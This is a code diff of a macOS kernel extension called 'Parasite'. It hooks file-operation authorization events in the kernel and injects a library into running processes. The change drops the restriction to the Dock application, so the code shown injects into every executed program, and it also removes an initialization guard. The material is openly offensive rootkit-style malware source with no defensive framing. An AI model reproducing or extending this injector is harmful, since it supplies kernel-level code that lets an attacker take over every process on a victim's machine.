@@ -11,18 +11,14 @@
 #include <sys/vnode.h>
 #include <sys/kauth.h>
 #include <kern/task.h>
-#include <sys/proc.h>
 
 #include "config.h"
 #include "kernel_symbols.h"
 #include "library_injector.h"
 
-#define SOLVE_KERNEL_SYMBOL(string, pointer) if (solve_kernel_symbol((string), (void**)&(pointer))) { printf("Can't solve kernel symbol %s", (string)); return KERN_FAILURE;}
-
 struct kernel_info g_kinfo;
-static boolean_t kernel_symbols_solved = FALSE;
 
-static boolean_t listener_initialized = FALSE;
+static boolean_t kernel_symbols_solved = FALSE;
 static kauth_listener_t listener = NULL;
 
 static int infection_overwatch(kauth_cred_t credential, void *idata, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)
@@ -43,19 +39,11 @@ static int infection_overwatch(kauth_cred_t credential, void *idata, kauth_actio
         
         char *path = (char *)arg1;
         
-        printf("[Parasite] This bird is fly: %s.\n", path);
+        vm_map_t task_map = _get_task_map(current_task());
+        vm_map_offset_t base_address = _get_map_min(task_map);
         
-        if (!strcmp(path, "/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock")) {
-            vm_map_t task_map = _get_task_map(current_task());
-            vm_map_offset_t base_address = _get_map_min(task_map);
-            
-            printf("[Parasite] Trying to inject library into %s.\n", path);
-            
-            if (inject_library(task_map, base_address, path, sizeof(path))) {
-                printf("[Parasite] Failed to inject library into %s.\n", path);
-            } else {
-                printf("[Parasite] Successfully injected library into %s.\n", path);
-            }
+        if (inject_library(task_map, base_address, path, sizeof(path))) {
+            printf("[Parasite] Failed to inject library into %s.\n", path);
         }
     }
     
@@ -69,15 +57,12 @@ kern_return_t Parasite_start(kmod_info_t *ki, void *d)
 {
     printf("[Parasite] Hello, I'm in memory.\n");
     
-    if (listener_initialized == FALSE) {
-        listener = kauth_listen_scope(KAUTH_SCOPE_FILEOP, &infection_overwatch, NULL);
-        
-        if (listener == NULL) {
-            printf("[Parasite] Damn, could not create listener.\n");
-        } else {
-            printf("[Parasite] Successfully created listener.\n");
-            listener_initialized = TRUE;
-        }
+    listener = kauth_listen_scope(KAUTH_SCOPE_FILEOP, &infection_overwatch, NULL);
+    
+    if (listener == NULL) {
+        printf("[Parasite] Damn, could not create listener.\n");
+    } else {
+        printf("[Parasite] Successfully created listener.\n");
     }
     
     return KERN_SUCCESS;
